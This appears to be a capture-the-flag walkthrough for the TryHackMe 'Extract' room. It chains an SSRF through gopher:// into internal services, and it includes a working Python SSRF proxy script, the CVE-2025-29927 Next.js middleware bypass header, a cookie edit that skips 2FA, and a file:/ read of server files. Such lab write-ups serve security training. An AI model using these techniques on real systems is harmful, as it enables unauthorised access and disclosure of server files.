
---
title: "TryHackMe: Extract Room Walkthrough"
categories: [TryHackMe]
tags: [linux, web, ssrf, file-disclosure, gopher, nextjs, php, cookie-tampering]

image:
  path: /assets/images/ext1.jpg
---

**Extract** challenge begins with identifying a **Server-Side Request Forgery (SSRF)** vulnerability, which we leveraged to discover an internal web application. By bypassing authentication on this internal app using a **Next.js Middleware** flaw and the `gopher://` scheme, we obtained the first flag along with a set of credentials.  

Using the same **SSRF** technique, we bypassed the IP restriction on the main web application to access a login page. Finally, by manipulating cookies to bypass **2FA**, we captured the second flag and completed the room.

[![Tryhackme Room Link](/assets/images/ext2.jpg){: width="300" height="300" .shadow}](https://tryhackme.com/room/extract){: .center }

## Initial Recon

### Nmap Scan

We started with a **full port scan**:

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.82.71
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

Open ports:

* **22** — SSH  
* **80** — HTTP  

### Web Application (Port 80)

Visiting `http://10.10.82.71/` displayed a document viewer. Selecting a document loaded it in an iframe via `/preview.php` with a `url` parameter.

![Web 80 Index](/assets/images/ext7.png){: width="1200" height="600"}

### Testing SSRF

We hosted a test file locally and accessed it via `/preview.php?url=http://10.14.101.76/test.txt`. The server fetched the content correctly:

```console
$ echo "test" > test.txt
$ python3 -m http.server 80
```

`file://` requests were blocked, but `gopher://` worked, allowing raw data injection for HTTP requests.

![Web 80 Preview Gopher Burp](/assets/images/ext7){: width="1000" height="500"}

```console
$ nc -lvnp 4444
```

### Discovering Internal Services

Using `gopher://` port scanning, we found **127.0.0.1:10000** running a Next.js application.

![Web 80 Preview 10000 Burp](/assets/images/ext3.png){: width="1000" height="500"}

### Simple Proxy to Access Internal Apps

We wrote a Python proxy to forward requests to internal ports through the SSRF:

```py
#!/usr/bin/env python3
import socket, requests, urllib.parse, threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.10.82.71"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        encoded = urllib.parse.quote(urllib.parse.quote(data))
        url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{encoded}"
        resp = requests.get(url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
```

Browsing `http://127.0.0.1:5000/` now allowed us to access `127.0.0.1:10000`.

### Bypassing Next.js Middleware Authentication

**CVE-2025-29927** allows bypassing authentication handled by Next.js middleware by sending the header:

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

Using this, we accessed `/customapi` and retrieved the first flag and credentials.

![Web 10000 Authentication Bypass](/assets/images/ext4.png){: width="1000" height="500"}

### Second Flag

Using the discovered credentials, we accessed `/management/` internally via the proxy. Login redirected to `/management/2fa.php` for 2FA. Inspecting cookies revealed the `auth_token` object with `validated` set to **false**. Changing it to **true** bypassed 2FA and gave the second flag.

![Web 80 Management Flag Burp](/assets/images/ext5.png){: width="1300" height="500"}

### Extra: File Disclosure

Although `file://` is blocked, `file:/` works, allowing `/preview.php` to read server files including the PHP source code.

![Web 80 Preview Unintended Burp](/assets/images/ext6.png){: width="1000" height="500"}

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
